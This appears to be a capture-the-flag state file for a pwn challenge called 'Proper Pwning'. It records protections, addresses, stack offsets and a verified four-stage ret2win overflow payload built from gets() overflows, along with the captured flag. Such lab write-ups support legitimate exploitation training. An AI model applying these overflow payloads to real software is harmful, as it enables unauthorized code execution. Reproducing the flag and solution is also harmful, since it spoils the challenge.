# Proper Pwning - state

## Metadata
- Category: Pwn
- Challenge ID: 17
- Artifacts: `proper`, `proper.c`, `Dockerfile`, `flag.txt`
- Target: `0.cloud.chals.io:21543`
- Status: solved, local and remote verified

## Recon
- `recon` result: FAST ret2win.
- Protections:
  - PIE: disabled
  - Canary: disabled
  - RELRO: partial
  - NX: not relevant; `-z execstack` in build flags
- Symbols available.
- `win()` address: `0x40123b`
- `ret` gadget for alignment: `0x40101a`

## Vulnerability
- Multiple `gets()` calls.
- Gate variables are stack locals placed after user buffers.
- Final `treasure_room()` has a large stack buffer and return address overwrite.

## Measured Offsets
- `gate1`: buffer to `gate` offset `0x10c`
- `gate2`: buffer to `baby_chicken` offset `0x208`; preserve `0x29`, then overwrite `gate`
- `gate3`: buffer to `gate` offset `0x4c`
- `treasure_room`: buffer to saved RIP offset `0x1a78`

## Verified Payload Plan
- Gate 1: `b"A" * 0x10c + p32(1)`
- Gate 2: `b"B" * 0x208 + p32(0x29) + p32(1)`
- Gate 3: `b"C" * 0x4c + p32(13371337)`
- Treasure: `b"D" * 0x1a78 + p64(0x40101a) + p64(0x40123b)`

## Flag
`bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}`

